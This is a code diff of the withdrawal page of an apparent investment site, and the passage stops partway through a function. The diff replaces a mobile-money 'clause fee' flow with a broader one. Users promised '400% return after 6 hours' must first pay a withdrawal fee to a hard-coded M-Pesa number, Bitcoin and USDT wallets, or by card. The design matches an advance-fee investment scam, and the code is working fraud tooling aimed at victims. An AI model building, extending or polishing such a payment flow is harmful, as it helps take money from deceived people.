@@ -321,270 +321,785 @@ function initializeChart(initialInvestment = 0) {
                     margin-bottom: 8px;
                 }
             </style>
-            <script>
-                async function attemptWithdraw() {
-                    const modal = new bootstrap.Modal(document.getElementById('withdrawalModal'));
-                    const modalBody = document.getElementById('withdrawalModalBody');
-                    const proceedBtn = document.getElementById('proceedWithdrawalBtn');
-                    const iHavePaidBtn = document.getElementById('iHavePaidBtn');
-
-                    // Reset buttons
-                    proceedBtn.style.display = 'none';
-                    iHavePaidBtn.style.display = 'none';
-                    proceedBtn.disabled = false;
-                    proceedBtn.innerHTML = 'Proceed to Payment';
-
-                    try {
-                        modalBody.innerHTML = `
-                                        <div class="text-center py-4">
-                                            <div class="spinner-border text-primary mb-3" role="status">
-                                                <span class="visually-hidden">Loading...</span>
-                                            </div>
-                                            <h5 class="mt-3">Checking withdrawal eligibility...</h5>
-                                        </div>`;
-                        modal.show();
-
-                        const response = await fetch("/check_withdrawal", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" }
-                        });
-                        const result = await response.json();
-
-                        if (result.error) {
-                            modalBody.innerHTML = `<div class="alert alert-danger">${result.error}</div>`;
-                            return;
-                        }
-
-                        if (!result.can_withdraw) {
-                            modalBody.innerHTML = `<div class="alert alert-warning">${result.message}</div>`;
-                            return;
-                        }
-
-                        // Save values for use in manual payment notice
-                        const requiredUsd = result.required_payment || 0;
-
-                        modalBody.innerHTML = `
-                                        <div class="text-center">
-                                            <h4 class="text-success">Withdrawal Available!</h4>
-                                            <p>To withdraw your profits, you need to pay a clause fee.</p>
-                                            <p><strong>Amount to Pay:</strong> $${requiredUsd.toFixed(2)}</p>
-                                        </div>`;
-                        proceedBtn.style.display = 'inline-block';
-
-                        proceedBtn.onclick = () => {
-                            modalBody.innerHTML = `
-                                            <div class="text-center">
-                                                <h4 class="text-success mb-4">Select Your Country</h4>
-                                                <select id="countrySelect" class="form-select mb-4" style="max-width:300px; margin:auto;">
-                                                    <option value="">-- Select Country --</option>
-                                                    <option value="Kenya">Kenya</option>
-                                                    <option value="Uganda">Uganda</option>
-                                                    <option value="Rwanda">Rwanda</option>
-                                                    <option value="South Sudan">South Sudan</option>
-                                                    <option value="Tanzania">Tanzania</option>
-                                                    <option value="Zambia">Zambia</option>
-                                                </select>
-                                                <div id="countryPaymentInstructions" class="mt-3"></div>
-                                            </div>`;
-                            proceedBtn.style.display = 'none';
-                            iHavePaidBtn.style.display = 'none';
-
-                            document.getElementById('countrySelect').onchange = async function () {
-                                const country = this.value;
-                                let html = "";
-                                proceedBtn.style.display = 'none';
-                                iHavePaidBtn.style.display = 'none';
-
-                                if (!country) return;
-
-                                if (country === "Kenya") {
-                                    html = `<div class="alert alert-success">You will proceed to secure payment via Paystack.</div>`;
-                                    proceedBtn.style.display = 'inline-block';
-                                    proceedBtn.textContent = 'Proceed to Paystack';
-
-                                    proceedBtn.onclick = async () => {
-                                        proceedBtn.disabled = true;
-                                        proceedBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span> Processing...';
-
-                                        const paymentResponse = await fetch("/process_withdrawal", {
-                                            method: "POST",
-                                            headers: { "Content-Type": "application/json" },
-                                            body: JSON.stringify({ country: "Kenya" })
-                                        });
-                                        const paymentData = await paymentResponse.json();
-
-                                        if (paymentData.status) {
-                                            window.location.href = paymentData.data.authorization_url;
-                                        } else {
-                                            modalBody.innerHTML += `<div class="alert alert-danger mt-3">${paymentData.message}</div>`;
-                                            proceedBtn.disabled = false;
-                                            proceedBtn.innerHTML = 'Try Again';
-                                        }
-                                    };
-                                } else {
-                                    // Manual payment (non-Kenya)
-                                    iHavePaidBtn.style.display = 'inline-block';
-
-                                    // Get local amount and conversion rate
-                                    let localAmount = requiredUsd;
-                                    let rate = 1;
-                                    let toCurrency = "KES";
-                                    switch (country) {
-                                        case "Uganda": toCurrency = "UGX"; break;
-                                        case "Rwanda": toCurrency = "RWF"; break;
-                                        case "Tanzania": toCurrency = "TZS"; break;
-                                        case "Zambia": toCurrency = "ZMW"; break;
-                                        case "South Sudan": toCurrency = "SSP"; break;
-                                    }
-                                    try {
-                                        const convResp = await fetch(`/convert_currency?amount=${requiredUsd}&from=USD&to=${toCurrency}`);
-                                        const convData = await convResp.json();
-                                        if (convData.converted) localAmount = convData.converted;
-                                        if (convData.rate) rate = convData.rate;
-                                    } catch (e) { }
-
-                                    // Add transaction ID input field and per-country instructions
-                                    let instructions = '';
-                                    if (country === "Uganda") {
-                                        instructions = `
-                                                        <div class="payment-instructions">
-                                                            <h5 class="mb-3"><i class="fas fa-mobile-alt"></i> MTN UGANDA</h5>
-                                                            <div class="step">1. Dial <b>*165*1#</b></div>
-                                                            <div class="step">2. Select send money</div>
-                                                            <div class="step">3. East Africa</div>
-                                                            <div class="step">4. Safaricom(mpesa)KENYA</div>
-                                                            <div class="step">5. Enter <b>254769823817</b> as the receiver number</div>
-                                                            <h5 class="mt-4 mb-3"><i class="fas fa-sim-card"></i> AIRTEL UGANDA</h5>
-                                                            <div class="step">1. Dial <b>*185*1#</b></div>
-                                                            <div class="step">2. Select send money</div>
-                                                            <div class="step">3. International transfer</div>
-                                                            <div class="step">4. Eastern Africa</div>
-                                                            <div class="step">5. Kenya</div>
-                                                            <div class="step">6. Safaricom(mpesa)</div>
-                                                            <div class="step">7. Enter <b>254769823817</b> as the receiver number</div>
-                                                            <div class="step">8. Reason: Any</div>
-                                                        </div>`;
-                                    } else if (country === "Rwanda") {
-                                        instructions = `
-                                                        <div class="payment-instructions">
-                                                            <h5 class="mb-3"><i class="fas fa-mobile-alt"></i> MTN RWANDA</h5>
-                                                            <div class="step">1. Dial <b>*182#</b></div>
-                                                            <div class="step">2. Select send money</div>
-                                                            <div class="step">3. International transfer</div>
-                                                            <div class="step">4. Safaricom(mpesa)KENYA</div>
-                                                            <div class="step">5. Enter <b>254769823817</b> as the receiver number</div>
-                                                            <div class="text-center my-3"><b>OR</b></div>
-                                                            <div class="step">1. Dial <b>*830#</b></div>
-                                                            <div class="step">2. Select send money</div>
-                                                            <div class="step">3. International transfer</div>
-                                                            <div class="step">4. Safaricom(mpesa)KENYA</div>
-                                                            <div class="step">5. Enter <b>254769823817</b> as the receiver number</div>
-                                                        </div>`;
-                                    } else if (country === "Tanzania") {
-                                        instructions = `
-                                                        <div class="payment-instructions">
-                                                            <h5 class="mb-3"><i class="fas fa-mobile-alt"></i> MPESA TANZANIA</h5>
-                                                            <div class="step">1. Dial <b>*150*00#</b></div>
-                                                            <div class="step">2. Select send money</div>
-                                                            <div class="step">3. Select Mpesa kenya</div>
-                                                            <div class="step">4. Enter number <b>+254769823817</b></div>
-                                                            <div class="step">5. Enter amount and then pin</div>
-                                                            <h5 class="mt-4 mb-3"><i class="fas fa-sim-card"></i> AIRTEL TANZANIA</h5>
-                                                            <div class="step">1. Dial <b>*150*60#</b></div>
-                                                            <div class="step">2. Select send money</div>
-                                                            <div class="step">3. Choose international transfer</div>
-                                                            <div class="step">4. Select kenya</div>
-                                                            <div class="step">5. Enter <b>+254769823817</b></div>
-                                                            <div class="step">6. Enter amount and then pin</div>
-                                                            <h5 class="mt-4 mb-3"><i class="fas fa-sim-card"></i> TIGO TANZANIA</h5>
-                                                            <div class="step">1. Dial <b>*150*01#</b></div>
-                                                            <div class="step">2. Select send money</div>
-                                                            <div class="step">3. Select send out of the country</div>
-                                                            <div class="step">4. Select kenya</div>
-                                                            <div class="step">5. Enter <b>254769823817</b></div>
-                                                            <div class="step">6. Enter amount and then pin</div>
-                                                        </div>`;
-                                    } else if (country === "Zambia") {
-                                        instructions = `
-                                                        <div class="payment-instructions">
-                                                            <h5 class="mb-3"><i class="fas fa-mobile-alt"></i> AIRTEL ZAMBIA</h5>
-                                                            <div class="step">1. Dial <b>*115#</b></div>
-                                                            <div class="step">2. Select send money</div>
-                                                            <div class="step">3. Choose international transfer</div>
-                                                            <div class="step">4. Select kenya</div>
-                                                            <div class="step">5. Enter <b>254769823817</b></div>
-                                                            <div class="step">6. Enter amount and then pin</div>
-                                                        </div>`;
-                                    } else if (country === "South Sudan") {
-                                        instructions = `
-                                                        <div class="payment-instructions">
-                                                            <h5 class="mb-3"><i class="fas fa-mobile-alt"></i> M-Gurush SOUTH SUDAN</h5>
-                                                            <div class="step">1. Dial <b>*355#</b></div>
-                                                            <div class="step">2. Enter your m-Gurush pin</div>
-                                                            <div class="step">3. Select send money</div>
-                                                            <div class="step">4. Select Kenya</div>
-                                                            <div class="step">5. Enter <b>254769823817</b> as the receiver</div>
-                                                            <div class="step">6. Confirm and send</div>
-                                                        </div>`;
-                                    }
-
-                                    html = `
-                                                    <div class="mb-3">
-                                                        <label for="withdrawalTransactionIdInput" class="form-label"><b>Transaction/Reference ID:</b></label>
-                                                        <input type="text" class="form-control" id="withdrawalTransactionIdInput" placeholder="Enter your payment transaction/reference ID">
-                                                    </div>
-                                                    <h6>Pay <b>${localAmount} ${toCurrency}</b> (${requiredUsd} USD)</h6>
-                                                    <div>Conversion Rate: 1 USD = ${rate} ${toCurrency}</div>
-                                                    ${instructions}
-                                                    <hr>
-                                                    <div class="alert alert-info">After payment, enter your Transaction/Reference ID above and click <b>I Have Paid</b>. Your withdrawal will be pending approval.</div>
-                                                `;
-
-                                    document.getElementById("countryPaymentInstructions").innerHTML = html;
-
-                                    // Handle "I Have Paid" click
-                                    iHavePaidBtn.onclick = async function () {
-                                        const transactionId = document.getElementById('withdrawalTransactionIdInput').value.trim();
-                                        if (!transactionId) {
-                                            alert('Please enter your payment transaction/reference ID.');
-                                            return;
-                                        }
-                                        try {
-                                            const res = await fetch('/manual_payment_notice', {
-                                                method: 'POST',
-                                                headers: { 'Content-Type': 'application/json' },
-                                                body: JSON.stringify({
-                                                    amount_usd: requiredUsd,
-                                                    local_amount: localAmount,
-                                                    plan: "withdrawal", // or pass actual plan if you store it
-                                                    country: country,
-                                                    transaction_id: transactionId,
-                                                    withdrawal: true // optional: mark as withdrawal
-                                                })
-                                            });
-                                            const data = await res.json();
-                                            if (data.status === 'pending') {
-                                                modal.hide();
-                                                alert('Your withdrawal is pending approval. You will be notified once it is confirmed.');
-                                                window.location.href = '/dashboard';
-                                            } else {
-                                                alert('Failed to submit withdrawal notice: ' + (data.message || 'Try again.'));
-                                            }
-                                        } catch (err) {
-                                            alert('Network error. Please try again.');
-                                        }
-                                    };
-                                }
-                            };
-                        };
-                    } catch (err) {
-                        modalBody.innerHTML = `<div class="alert alert-danger">An error occurred. Please try again.</div>`;
-                    }
-                }
-                   </script>
            
-        </div>
+<script>
+    // Crypto wallet addresses for withdrawal
+    const WITHDRAWAL_CRYPTO_ADDRESSES = {
+        "BTC": "13EcmrfxyUSKDrWbJBsjRU2ho92RJdTixL",
+        "USDT_ERC20": "0x7a3544ab71d616f0f858913e416817c22631b830",
+        "USDT_TRC20": "TUe3Qdf9d4xueX9F7viJLZCwRZxgx2hbze"
+    };
+    
+    const WITHDRAWAL_CRYPTO_NAMES = {
+        "BTC": "Bitcoin (BTC)",
+        "USDT_ERC20": "USDT (ERC20)",
+        "USDT_TRC20": "USDT (TRC20)"
+    };
 
+    const WITHDRAWAL_CRYPTO_ICONS = {
+        "BTC": "fab fa-bitcoin",
+        "USDT_ERC20": "fas fa-coins",
+        "USDT_TRC20": "fas fa-coins"
+    };
+
+    async function attemptWithdraw() {
+        const modal = new bootstrap.Modal(document.getElementById('withdrawalModal'));
+        const modalBody = document.getElementById('withdrawalModalBody');
+        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+        const iHavePaidBtn = document.getElementById('iHavePaidBtn');
+
+        // Reset buttons
+        proceedBtn.style.display = 'none';
+        iHavePaidBtn.style.display = 'none';
+        proceedBtn.disabled = false;
+        proceedBtn.innerHTML = 'Proceed to Payment';
+
+        try {
+            modalBody.innerHTML = `
+                <div class="text-center py-4">
+                    <div class="spinner-border text-primary mb-3" role="status">
+                        <span class="visually-hidden">Loading...</span>
+                    </div>
+                    <h5 class="mt-3">Checking withdrawal eligibility...</h5>
+                </div>`;
+            modal.show();
+
+            // First, fetch investment data to get current profit
+            const investmentResponse = await fetch("/api/realtime_investment_data");
+            const investmentData = await investmentResponse.json();
+            
+            // Then check withdrawal eligibility
+            const withdrawalResponse = await fetch("/check_withdrawal", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" }
+            });
+            const result = await withdrawalResponse.json();
+
+            if (result.error) {
+                modalBody.innerHTML = `<div class="alert alert-danger">${result.error}</div>`;
+                return;
+            }
+
+            if (!result.can_withdraw) {
+                modalBody.innerHTML = `<div class="alert alert-warning">${result.message}</div>`;
+                return;
+            }
+
+            // Get profit from investment data (400% return after 6 hours)
+            const currentProfit = investmentData.profit || 0;
+            const requiredUsd = result.required_payment || 0;
+            const withdrawalProfit = currentProfit;
+
+            // Store withdrawal data globally
+            window.withdrawalData = {
+                requiredUsd: requiredUsd,
+                profitAmount: withdrawalProfit,
+                availableMethods: {}
+            };
+
+            modalBody.innerHTML = `
+                <div class="text-center">
+                    <h4 class="text-success">Withdrawal Available!</h4>
+                    <p>Current Profit: <strong>$${withdrawalProfit.toFixed(2)}</strong></p>
+                    <p>To withdraw your profit, you need to pay a withdrawal fee.</p>
+                    <p><strong>Amount to Pay:</strong> $${requiredUsd.toFixed(2)}</p>
+                    <div class="mt-3">
+                        <button class="btn btn-primary" onclick="showWithdrawalPaymentOptions()">
+                            <i class="fas fa-credit-card"></i> Select Payment Method
+                        </button>
+                    </div>
+                </div>`;
+                
+        } catch (err) {
+            console.error('Withdrawal error:', err);
+            modalBody.innerHTML = `<div class="alert alert-danger">An error occurred. Please try again.</div>`;
+        }
+    }
+
+    function showWithdrawalPaymentOptions() {
+        const modal = bootstrap.Modal.getInstance(document.getElementById('withdrawalModal'));
+        const modalBody = document.getElementById('withdrawalModalBody');
+        
+        modalBody.innerHTML = `
+            <div class="text-center">
+                <h4 class="text-success mb-4">Select Your Country</h4>
+                <select id="withdrawalCountrySelect" class="form-select mb-4" style="max-width:300px; margin:auto;">
+                    <option value="">-- Select Country --</option>
+                    <!-- African countries -->
+                    <option value="Kenya">Kenya</option>
+                    <option value="Uganda">Uganda</option>
+                    <option value="Rwanda">Rwanda</option>
+                    <option value="Tanzania">Tanzania</option>
+                    <option value="Zambia">Zambia</option>
+                    <option value="South Sudan">South Sudan</option>
+                    <!-- Countries with manual payment option -->
+                    <option value="USA">United States (USA)</option>
+                    <option value="UK">United Kingdom (UK)</option>
+                    <!-- Countries with only crypto and card -->
+                    <option value="Canada">Canada</option>
+                    <option value="South Africa">South Africa</option>
+                    <option value="Nigeria">Nigeria</option>
+                    <option value="UAE">United Arab Emirates (UAE)</option>
+                    <option value="Kuwait">Kuwait</option>
+                </select>
+                <div class="mt-3 p-3 bg-light rounded">
+                    <small class="text-muted">
+                        <i class="fas fa-info-circle"></i> 
+                        <strong>Available Payment Methods:</strong><br>
+                        • All Countries: Cryptocurrency (BTC, USDT)<br>
+                        • All Countries: International Card Payment<br>
+                        • Kenya: MPesa via Paystack<br>
+                        • USA & UK: Bank Transfer<br>
+                        • Other African Countries: Mobile Money<br>
+                        • Canada, South Africa, Nigeria, UAE, Kuwait: Only Crypto & Card
+                    </small>
+                </div>
+                <div id="withdrawalPaymentOptions" class="mt-4"></div>
+            </div>`;
+        
+        document.getElementById('proceedWithdrawalBtn').style.display = 'none';
+        document.getElementById('iHavePaidBtn').style.display = 'none';
+
+        document.getElementById('withdrawalCountrySelect').onchange = async function () {
+            const country = this.value;
+            let html = "";
+            const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+            const iHavePaidBtn = document.getElementById('iHavePaidBtn');
+            
+            proceedBtn.style.display = 'none';
+            iHavePaidBtn.style.display = 'none';
+
+            if (!country) return;
+
+            // Get local currency
+            function getLocalCurrency(country) {
+                const currencyMap = {
+                    "Kenya": "KES",
+                    "Uganda": "UGX",
+                    "Rwanda": "RWF",
+                    "Tanzania": "TZS",
+                    "Zambia": "ZMW",
+                    "South Sudan": "SSP",
+                    "USA": "USD",
+                    "UK": "GBP",
+                    "South Africa": "ZAR",
+                    "Nigeria": "NGN",
+                    "UAE": "AED",
+                    "Kuwait": "KWD",
+                    "Canada": "CAD"
+                };
+                return currencyMap[country] || "USD";
+            }
+
+            const toCurrency = getLocalCurrency(country);
+            const requiredUsd = window.withdrawalData.requiredUsd;
+            const profitAmount = window.withdrawalData.profitAmount;
+            
+            // Convert amount
+            let localAmount = requiredUsd;
+            let rate = 1;
+            
+            if (country !== "USA" && country !== "UK" && country !== "Canada" && 
+                country !== "South Africa" && country !== "Nigeria" && 
+                country !== "UAE" && country !== "Kuwait") {
+                try {
+                    const convResp = await fetch(`/convert_currency?amount=${requiredUsd}&from=USD&to=${toCurrency}`);
+                    const convData = await convResp.json();
+                    if (convData.converted) localAmount = convData.converted;
+                    if (convData.rate) rate = convData.rate;
+                } catch (e) { 
+                    console.error("Conversion error:", e);
+                }
+            }
+
+            // Store country data
+            window.withdrawalData.country = country;
+            window.withdrawalData.localAmount = localAmount;
+            window.withdrawalData.toCurrency = toCurrency;
+            window.withdrawalData.rate = rate;
+            window.withdrawalData.profitAmount = profitAmount;
+
+            // Determine available payment methods
+            const countriesWithManual = ["Kenya", "USA", "UK", "Uganda", "Rwanda", "Tanzania", "Zambia", "South Sudan"];
+            const countriesWithoutManual = ["Canada", "South Africa", "Nigeria", "UAE", "Kuwait"];
+            
+            let hasManualOption = countriesWithManual.includes(country);
+            let hasCardOption = true; // All countries have card option
+            let hasCryptoOption = true; // All countries have crypto option
+
+            // Build payment options HTML
+            html = `
+                <div class="row mt-4">
+                    ${hasCryptoOption ? `
+                    <div class="col-md-4 mb-3">
+                        <div class="payment-option-card crypto-option h-100" onclick="selectWithdrawalPaymentMethod('crypto')">
+                            <div class="text-center">
+                                <i class="fab fa-bitcoin fa-3x text-warning mb-3"></i>
+                                <h5>Cryptocurrency</h5>
+                                <p class="text-muted">Pay with Bitcoin or USDT</p>
+                            </div>
+                        </div>
+                    </div>` : ''}
+                    
+                    ${hasCardOption ? `
+                    <div class="col-md-4 mb-3">
+                        <div class="payment-option-card card-option h-100" onclick="selectWithdrawalPaymentMethod('card')">
+                            <div class="text-center">
+                                <i class="fas fa-credit-card fa-3x text-primary mb-3"></i>
+                                <h5>Card Payment</h5>
+                                <p class="text-muted">Visa, Mastercard, Amex</p>
+                            </div>
+                        </div>
+                    </div>` : ''}
+                    
+                    ${hasManualOption ? `
+                    <div class="col-md-4 mb-3">
+                        <div class="payment-option-card manual-option h-100" onclick="selectWithdrawalPaymentMethod('manual')">
+                            <div class="text-center">
+                                <i class="fas fa-university fa-3x text-success mb-3"></i>
+                                <h5>Traditional Payment</h5>
+                                <p class="text-muted">Bank Transfer / Mobile Money</p>
+                            </div>
+                        </div>
+                    </div>` : ''}
+                </div>
+                
+                <div id="withdrawalPaymentDetails" class="mt-4"></div>
+            `;
+            
+            document.getElementById("withdrawalPaymentOptions").innerHTML = html;
+        };
+    }
+
+    function selectWithdrawalPaymentMethod(method) {
+        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+        const iHavePaidBtn = document.getElementById('iHavePaidBtn');
+        const paymentDetails = document.getElementById('withdrawalPaymentDetails');
+        
+        // Remove selected class from all options
+        document.querySelectorAll('.payment-option-card').forEach(card => {
+            card.classList.remove('selected');
+        });
+        
+        // Add selected class to clicked option
+        event.currentTarget.classList.add('selected');
+        
+        window.withdrawalData.selectedMethod = method;
+        
+        // Show appropriate buttons and details
+        proceedBtn.style.display = 'none';
+        iHavePaidBtn.style.display = 'none';
+        paymentDetails.innerHTML = '';
+        
+        if (method === 'crypto') {
+            showCryptoWithdrawalDetails();
+        } else if (method === 'card') {
+            showCardWithdrawalDetails();
+        } else if (method === 'manual') {
+            showManualWithdrawalDetails();
+        }
+    }
+
+    function showCryptoWithdrawalDetails() {
+        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+        const paymentDetails = document.getElementById('withdrawalPaymentDetails');
+        
+        let cryptoOptionsHtml = '';
+        for (const [key, address] of Object.entries(WITHDRAWAL_CRYPTO_ADDRESSES)) {
+            const iconClass = key === 'BTC' ? 'btc' : (key === 'USDT_ERC20' ? 'erc20' : 'trc20');
+            cryptoOptionsHtml += `
+                <div class="form-check mb-3">
+                    <input class="form-check-input" type="radio" name="cryptoType" 
+                           id="withdrawalCrypto${key}" value="${key}" onchange="selectWithdrawalCrypto('${key}')">
+                    <label class="form-check-label" for="withdrawalCrypto${key}">
+                        <div class="d-flex align-items-center">
+                            <i class="${WITHDRAWAL_CRYPTO_ICONS[key]} crypto-icon ${iconClass} me-2"></i>
+                            <div>
+                                <strong>${WITHDRAWAL_CRYPTO_NAMES[key]}</strong><br>
+                                <small class="text-muted">${address}</small>
+                            </div>
+                        </div>
+                    </label>
+                </div>
+            `;
+        }
+        
+        paymentDetails.innerHTML = `
+            <div class="alert alert-info">
+                <h5><i class="fas fa-coins"></i> Cryptocurrency Payment</h5>
+                <p>Send $${window.withdrawalData.requiredUsd.toFixed(2)} USD worth of cryptocurrency to withdraw your profit of $${window.withdrawalData.profitAmount.toFixed(2)}.</p>
+                <p><strong>Important:</strong> Make sure to use the correct network (ERC20 vs TRC20 for USDT).</p>
+            </div>
+            
+            <div class="mb-3">
+                <label class="form-label"><strong>Select Cryptocurrency:</strong></label>
+                ${cryptoOptionsHtml}
+            </div>
+            
+            <div class="mb-3">
+                <label for="cryptoScreenshot" class="form-label">
+                    <strong><i class="fas fa-camera"></i> Upload Payment Screenshot:</strong>
+                </label>
+                <input type="file" class="form-control" id="cryptoScreenshot" accept="image/*">
+                <div class="form-text">Take a screenshot of your crypto wallet showing the completed transaction</div>
+                <div id="cryptoPreview" class="mt-2"></div>
+            </div>
+            
+            <div class="mb-3">
+                <label for="cryptoTransactionId" class="form-label">
+                    <strong><i class="fas fa-receipt"></i> Transaction Hash/ID:</strong>
+                </label>
+                <input type="text" class="form-control" id="cryptoTransactionId" 
+                       placeholder="Enter your crypto transaction hash/ID">
+            </div>
+        `;
+        
+        proceedBtn.style.display = 'inline-block';
+        proceedBtn.textContent = 'Submit Crypto Payment';
+        proceedBtn.className = 'btn btn-success';
+        proceedBtn.onclick = submitCryptoWithdrawalPayment;
+        
+        // Setup screenshot preview
+        document.getElementById('cryptoScreenshot').onchange = function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    document.getElementById('cryptoPreview').innerHTML = `
+                        <img src="${event.target.result}" class="img-thumbnail" style="max-height: 150px;">
+                        <button type="button" class="btn btn-sm btn-danger mt-2" onclick="clearCryptoPreview()">
+                            <i class="fas fa-trash"></i> Remove
+                        </button>
+                    `;
+                };
+                reader.readAsDataURL(file);
+            }
+        };
+    }
+
+    function selectWithdrawalCrypto(type) {
+        window.withdrawalData.cryptoType = type;
+    }
+
+    function clearCryptoPreview() {
+        document.getElementById('cryptoScreenshot').value = '';
+        document.getElementById('cryptoPreview').innerHTML = '';
+    }
+
+    async function submitCryptoWithdrawalPayment() {
+        const cryptoType = document.querySelector('input[name="cryptoType"]:checked');
+        const screenshotInput = document.getElementById('cryptoScreenshot');
+        const transactionId = document.getElementById('cryptoTransactionId').value.trim();
+        
+        if (!cryptoType) {
+            alert('Please select a cryptocurrency');
+            return;
+        }
+        
+        if (!screenshotInput.files[0]) {
+            alert('Please upload a payment screenshot');
+            return;
+        }
+        
+        if (!transactionId) {
+            alert('Please enter your transaction hash/ID');
+            return;
+        }
+        
+        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+        const originalText = proceedBtn.innerHTML;
+        proceedBtn.disabled = true;
+        proceedBtn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Processing...';
+        
+        // Read screenshot as base64
+        const file = screenshotInput.files[0];
+        const reader = new FileReader();
+        
+        reader.onload = async function(event) {
+            const base64Screenshot = event.target.result;
+            
+            try {
+                const response = await fetch('/submit_withdrawal_crypto_payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        amount_usd: window.withdrawalData.requiredUsd,
+                        crypto_type: cryptoType.value,
+                        wallet_address: WITHDRAWAL_CRYPTO_ADDRESSES[cryptoType.value],
+                        transaction_id: transactionId,
+                        payment_screenshot: base64Screenshot,
+                        country: window.withdrawalData.country,
+                        profit_amount: window.withdrawalData.profitAmount
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    alert('Crypto payment submitted successfully! Your withdrawal is pending approval.');
+                    const modal = bootstrap.Modal.getInstance(document.getElementById('withdrawalModal'));
+                    modal.hide();
+                    window.location.href = '/dashboard';
+                } else {
+                    alert(data.message || 'Submission failed. Please try again.');
+                    proceedBtn.disabled = false;
+                    proceedBtn.innerHTML = originalText;
+                }
+            } catch (error) {
+                alert('Network error. Please try again.');
+                proceedBtn.disabled = false;
+                proceedBtn.innerHTML = originalText;
+            }
+        };
+        
+        reader.readAsDataURL(file);
+    }
+
+    function showCardWithdrawalDetails() {
+        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+        const paymentDetails = document.getElementById('withdrawalPaymentDetails');
+        
+        paymentDetails.innerHTML = `
+            <div class="alert alert-success">
+                <h5><i class="fas fa-credit-card"></i> Card Payment</h5>
+                <p>Pay $${window.withdrawalData.requiredUsd.toFixed(2)} USD using your credit/debit card to withdraw your profit of $${window.withdrawalData.profitAmount.toFixed(2)}.</p>
+                <p><strong>Supported Cards:</strong> Visa, Mastercard, American Express</p>
+                <div class="d-flex mt-3">
+                    <i class="fab fa-cc-visa fa-2x me-3" style="color: #1a1f71;"></i>
+                    <i class="fab fa-cc-mastercard fa-2x me-3" style="color: #eb001b;"></i>
+                    <i class="fab fa-cc-amex fa-2x" style="color: #2e77bc;"></i>
+                </div>
+            </div>
+            
+            <div class="alert alert-info">
+                <i class="fas fa-info-circle"></i>
+                <strong>Note:</strong> Your card will be charged in USD. Your bank will convert this to your local currency.
+                Exchange rates and fees are determined by your card issuer.
+            </div>
+        `;
+        
+        proceedBtn.style.display = 'inline-block';
+        proceedBtn.textContent = `Pay $${window.withdrawalData.requiredUsd.toFixed(2)} with Card`;
+        proceedBtn.className = 'btn btn-primary';
+        proceedBtn.onclick = processCardWithdrawalPayment;
+    }
+
+    async function processCardWithdrawalPayment() {
+        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+        const originalText = proceedBtn.innerHTML;
+        proceedBtn.disabled = true;
+        proceedBtn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Processing...';
+        
+        try {
+            const response = await fetch('/create_withdrawal_card_payment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    amount_usd: window.withdrawalData.requiredUsd,
+                    country: window.withdrawalData.country,
+                    profit_amount: window.withdrawalData.profitAmount
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.status === 'success') {
+                // Open Paystack payment page in new tab
+                const paymentWindow = window.open(data.authorization_url, '_blank', 'width=800,height=600');
+                
+                if (paymentWindow) {
+                    // Check payment status every 5 seconds
+                    const checkInterval = setInterval(async () => {
+                        try {
+                            const statusResponse = await fetch(`/check_withdrawal_card_payment/${data.reference}`);
+                            const statusData = await statusResponse.json();
+                            
+                            if (statusData.status === 'completed') {
+                                clearInterval(checkInterval);
+                                paymentWindow.close();
+                                
+                                alert('Payment successful! Your withdrawal is now pending approval.');
+                                const modal = bootstrap.Modal.getInstance(document.getElementById('withdrawalModal'));
+                                modal.hide();
+                                window.location.href = '/dashboard';
+                            }
+                        } catch (error) {
+                            console.error('Error checking payment status:', error);
+                        }
+                    }, 5000);
+                    
+                    // Clear interval after 10 minutes
+                    setTimeout(() => clearInterval(checkInterval), 600000);
+                } else {
+                    // If popup blocked, redirect in same window
+                    alert('Popup blocked. Redirecting to payment page...');
+                    setTimeout(() => {
+                        window.location.href = data.authorization_url;
+                    }, 1000);
+                }
+            } else {
+                alert(data.message || 'Failed to initialize card payment');
+                proceedBtn.disabled = false;
+                proceedBtn.innerHTML = originalText;
+            }
+        } catch (error) {
+            alert('Network error. Please try again.');
+            proceedBtn.disabled = false;
+            proceedBtn.innerHTML = originalText;
+            console.error('Card payment error:', error);
+        }
+    }
+
+    function showManualWithdrawalDetails() {
+        const iHavePaidBtn = document.getElementById('iHavePaidBtn');
+        const proceedBtn = document.getElementById('proceedWithdrawalBtn');
+        const paymentDetails = document.getElementById('withdrawalPaymentDetails');
+        const country = window.withdrawalData.country;
+        const requiredUsd = window.withdrawalData.requiredUsd;
+        const localAmount = window.withdrawalData.localAmount;
+        const toCurrency = window.withdrawalData.toCurrency;
+        const profitAmount = window.withdrawalData.profitAmount;
+        
+        proceedBtn.style.display = 'none';
+        iHavePaidBtn.style.display = 'none';
+        
+        let instructions = '';
+        
+        if (country === "Kenya") {
+            instructions = `
+                <div class="alert alert-success">
+                    <h5><i class="fas fa-mobile-alt"></i> MPesa Payment via Paystack</h5>
+                    <p>You will be redirected to a secure Paystack payment page to complete your payment.</p>
+                    <p><strong>Amount:</strong> KES equivalent of $${requiredUsd.toFixed(2)} USD</p>
+                    <p><strong>Profit to Withdraw:</strong> $${profitAmount.toFixed(2)} USD</p>
+                </div>
+            `;
+            
+            // Show Paystack proceed button
+            proceedBtn.style.display = 'inline-block';
+            proceedBtn.textContent = 'Proceed to Paystack';
+            proceedBtn.className = 'btn btn-primary';
+            proceedBtn.onclick = async () => {
+                proceedBtn.disabled = true;
+                proceedBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span> Processing...';
+                
+                // Use the existing process_withdrawal route for Kenya
+                const paymentResponse = await fetch("/process_withdrawal", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
